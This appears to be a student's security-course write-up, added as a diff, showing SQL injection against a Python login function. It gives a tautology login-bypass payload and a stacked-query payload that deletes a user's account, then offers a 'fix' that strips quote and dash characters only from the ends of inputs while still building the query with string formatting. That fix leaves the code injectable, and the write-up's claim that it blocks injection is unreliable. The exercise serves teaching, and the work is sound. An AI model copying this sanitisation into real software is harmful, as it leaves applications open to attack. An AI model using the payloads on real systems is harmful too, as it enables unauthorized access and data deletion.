@@ -1,0 +1,69 @@
+Author:  Elita Danilyuk
+eid:  elita
+
+Assignment: Part 1
+  code:
+    N/A (did not change)
+  input: 
+    Enter Username
+      [any input] or ' OR 1=1; --
+    Enter Password:
+      ' OR 1=1; --
+  output:
+    Enter Password:	
+    Successful login
+
+  Explanation:
+    The "' OR 1=1; --" input is passing a tautology which will result in the entire query to evaluate to true.
+    The tautology along with the "; --" completes the SQL code and proves the login to be true, regardless if it is.
+
+Assignment: Part 2
+  code:
+    N/A (did not change)
+  input:
+    Enter Username
+      '; DELETE FROM account WHERE username="paul"; --
+    Enter Password:
+      [any input]
+  output:
+    [(3, 'mark', 'abcdef')]
+
+  Explanation:
+    The "'; DELETE FROM account WHERE username="paul"; --" is a SQL injection to delete the users account whose user name is paul in the account table.
+    This injection along with the "; --" completes the injection and removes the account of the, existing, entered users name.
+
+Assignment: Part 3
+  code:
+    def sqli():
+    u_name = str(input("Enter Username\t"))
+    print("Enter Password:\t")
+    p_word = getpass()
+    #sanitize u_name and p_word here. You are free to do it your way.
+    u_name = u_name.strip("\'\"-")
+    p_word = p_word.strip("\'\"-")
+
+    try:
+        c.execute("SELECT username, password FROM account WHERE username='%s' AND password='%s'" %(u_name, p_word))
+    except:
+        c.executescript("SELECT username, password FROM account WHERE username='%s' AND password='%s'" %(u_name, p_word))
+    if c.fetchone():
+        print("Successful login")
+    else:
+        print("Failed login")
+        
+    sqli()
+
+  input:
+    Enter Username
+      [any input] or ' OR 1=1; --
+    Enter Password:
+      ' OR 1=1; --
+  output:
+    Enter Password:	
+    Failed login
+
+  Explanation:
+    The updated code consists of a strip method to remove malicious characters from user inputs.
+    The characters that are stripped from the user name and password inputs are ', ", and -.
+    These characters allow for SQL injections, thus stripping it from the input does nt allow for the SQL injection.
+    The code was tested with the tautology SQL injection "' OR 1=1; --" and it failed to login.
